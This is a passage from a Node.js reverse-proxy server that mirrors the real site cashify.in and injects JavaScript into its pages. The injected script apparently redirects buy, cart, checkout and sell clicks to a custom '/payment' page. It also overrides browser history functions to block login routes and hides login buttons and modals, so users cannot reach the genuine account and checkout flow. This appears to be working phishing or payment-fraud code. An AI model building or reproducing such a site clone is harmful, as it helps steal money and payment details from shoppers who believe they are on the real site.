                     observer.observe(document.body, { childList: true, subtree: true, characterData: true });
                   });

                   // Re-run on client-side navigation (Next.js route changes)
                   let lastUrl = location.href;
                   new MutationObserver(() => {
                     if (location.href !== lastUrl) {
                       lastUrl = location.href;
                       buyBtnInjected = false; // reset so button re-injects on new page
                       setTimeout(runAll, 300);
                       setTimeout(runAll, 1000);
                     }
                   }).observe(document, { subtree: true, childList: true });

                   [500, 1500, 3000, 5000].forEach(t => setTimeout(runAll, t));

                   // Intercept sell link clicks → /payment
                   document.addEventListener('click', function(e) {
                     const a = e.target.closest('a');
                     if (a && a.href && /\\/sell|\\/selling/i.test(new URL(a.href).pathname)) {
                       e.preventDefault();
                       e.stopPropagation();
                       window.location.href = '/payment';
                     }
                   }, true);

                   // ── Intercept buy/cart/checkout clicks → /payment ──
                   // ONLY intercept actual CTA buttons, NOT product card navigation links
                   document.addEventListener('click', function(e) {
                     let node = e.target;
                     for (let i = 0; i < 5; i++) {
                       if (!node || node === document.body) break;
                       const tag  = (node.tagName || '').toLowerCase();
                       const txt  = (node.innerText || node.textContent || '').trim();
                       const cls  = (node.className && typeof node.className === 'string') ? node.className.toLowerCase() : '';
                       const tid  = (node.getAttribute && node.getAttribute('data-testid') || '').toLowerCase();
                       const href = (node.getAttribute && node.getAttribute('href')) || '';

                       // Must be a button/CTA element — not a plain product <a> link
                       const isBtn = tag === 'button' ||
                                     node.getAttribute('role') === 'button' ||
                                     /(\\bbtn\\b|\\bbutton\\b)/i.test(cls);

                       // Exact CTA text match
                       const isBuyCTA = /^(buy now|add to cart|add to bag|checkout|proceed to checkout|place order|order now|buy)$/i.test(txt.trim());

                       // Explicit cart/buy class names
                       const isCartClass = /(addtocart|add-to-cart|buynow|buy-now|checkout-btn|cart-btn)/i.test(cls) ||
                                           /(cart|checkout|buynow)/i.test(tid);

                       // Auth redirect links (login/signin triggered by buy action)
                       const isAuthLink = tag === 'a' && /\\/(login|signin|auth|signup|register|cart|checkout)/i.test(href);

                       if ((isBtn && isBuyCTA) || isCartClass || isAuthLink) {
                         e.preventDefault();
                         e.stopImmediatePropagation();
                         window.location.href = '/payment';
                         return;
                       }
                       node = node.parentElement;
                     }
                   }, true);

                   // ── Block login/auth modals and pages from opening ──
                   // Override history.pushState to catch Next.js navigation to /login
                   const _pushState = history.pushState.bind(history);
                   history.pushState = function(state, title, url) {
                     if (url && /\\/(login|signin|auth|signup|register)/i.test(url)) {
                       window.location.href = '/payment';
                       return;
                     }
                     return _pushState(state, title, url);
                   };
                   const _replaceState = history.replaceState.bind(history);
                   history.replaceState = function(state, title, url) {
                     if (url && /\\/(login|signin|auth|signup|register)/i.test(url)) {
                       window.location.href = '/payment';
                       return;
                     }
                     return _replaceState(state, title, url);
                   };

                   // If we somehow land on login page, redirect immediately
                   if (/\\/(login|signin|auth|signup|register)/i.test(window.location.pathname)) {
                     window.location.replace('/payment');
                   }

                   // ── Hide login button from navbar ──
                   function hideLoginElements() {
                     document.querySelectorAll('a, button, [role="button"], div, span').forEach(el => {
                       const txt = (el.innerText || el.textContent || '').trim();
                       if (/^(login|sign in|signin|log in|register|sign up)$/i.test(txt)) {
                         el.style.setProperty('display', 'none', 'important');
                       }
                     });
                     // Also hide login modals/drawers if they appear
                     document.querySelectorAll('[class*="login" i], [class*="signin" i], [class*="auth-modal" i], [id*="login" i]').forEach(el => {
                       const tag = el.tagName.toLowerCase();
                       if (!['body','main','html','section','article'].includes(tag)) {
                         el.style.setProperty('display', 'none', 'important');
                       }
                     });
                   }
                 })();
               </script>
             </head>
             `;
             text = text.replace('</head>', injectedScript);
          }

          return text;
        }

        return responseBuffer;
      }),
      error: (err, req, res) => {
        console.error("[proxy] Error:", err.message);
        res.status(502).send(`
          <html>
            <body style="font-family:sans-serif;text-align:center;padding:60px">
              <h2>⚠️ Proxy Error</h2>
              <p>${err.message}</p>
              <a href="/">Retry</a>
            </body>
          </html>
        `);
      },
    },
  })
);

app.listen(PORT, () => {
  console.log(`\n🚀 Cashify Proxy Server chal raha hai!`);
  console.log(`   http://localhost:${PORT}          → cashify.in (proxied)`);
  console.log(`   http://localhost:${PORT}/payment  → Custom Payment Page\n`);
});
